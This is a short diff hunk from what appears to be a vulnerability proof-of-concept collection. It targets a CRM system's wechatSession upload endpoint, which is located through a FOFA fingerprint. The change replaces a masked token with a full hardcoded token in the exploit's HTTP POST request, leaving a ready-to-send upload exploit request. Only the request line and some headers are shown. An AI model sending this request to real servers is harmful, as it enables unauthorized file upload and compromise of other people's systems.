@@ -76,7 +76,7 @@ FOFA：body="include/js/ldAjax.js"
 POC/EXP：
 
 ```http
-POST /crm/wechatSession/index.php?token=9******************************f&msgid=1&operation=upload HTTP/1.1
+POST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
 Accept-Encoding: gzip, deflate
